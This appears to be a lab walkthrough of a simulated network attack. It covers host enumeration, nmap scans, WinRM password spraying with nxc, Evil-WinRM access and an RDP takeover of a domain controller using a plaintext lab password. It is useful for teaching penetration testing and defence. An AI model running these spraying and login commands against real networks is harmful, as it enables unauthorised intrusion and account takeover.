# Lateral Movement & Privilege Escalation

## 🏴 Objective
After gaining initial access to **janed@linux-client**, the attacker attempts to move laterally across the network and escalate privileges to gain control over key systems, including the **Windows Client** and ultimately the **Domain Controller**.

---

## 🚀 Steps Taken

### 1️⃣ Enumeration on the Compromised Machine (janed@linux-client)
```bash
cat /etc/os-release  # Check OS version
hostname             # Identify the machine name
```

### 2️⃣ Network Scanning for More Targets
On another terminal, scanning the **Windows Client (10.0.0.100)**:
```bash
nmap -p1-1000 -sV -Pn 10.0.0.100
```
Scanning the **Linux Client (10.0.0.101)**:
```bash
nmap -Pn -p5985,5986 -sV 10.0.0.101  # Checking for WinRM services
```
Results show **WinRM (Windows Remote Management) is filtered**.

---

## 🔐 Password Spraying Attack
Since WinRM is present, the attacker attempts password spraying.

1. Create `users.txt` and `pass.txt` containing potential credentials:
   ```
   users.txt:
   Administrator
   
   pass.txt:
   @Deeboodah1!
   password123!
   admin@123
   ```
2. Perform password spraying with **nxc winrm**:
   ```bash
   nxc winrm 10.0.0.100 -u users.txt -p pass.txt
   ```
   ✅ A working credential is found: **Administrator / @Deeboodah1!**

3. Use **Evil-WinRM** to access the Windows Client as Administrator:
   ```bash
   evil-winrm -i 10.0.0.100 -u Administrator -p @Deeboodah1!
   ```
   📌 This grants **PowerShell administrator access** to the Windows Client.

---

## 🏰 Gaining Access to the Domain Controller

1. Scan the **Domain Controller (10.0.0.5)** for open services:
   ```bash
   nmap -Pn 10.0.0.5
   ```
   ✅ Port `3389/tcp` (Microsoft Remote Desktop) is open.

2. Use **xfreerdp** to establish an RDP session to the **Domain Controller**:
   ```bash
   xfreerdp /v:10.0.0.5 /u:Administrator /p:@Deeboodah1! /d:corp.project-x-dc.com
   ```
   ✅ A new **RDP window** pops up, providing full control over the **Domain Controller**!

---

## 🎯 Summary
The attacker successfully:
- **Escalated privileges** from janed@linux-client to Administrator on Windows Client.
- **Laterally moved** to the Windows Client using WinRM.
- **Compromised the Domain Controller** using **RDP credentials**.

🔜 Next Phase: **Data Exfiltration & Persistence** 📂💀

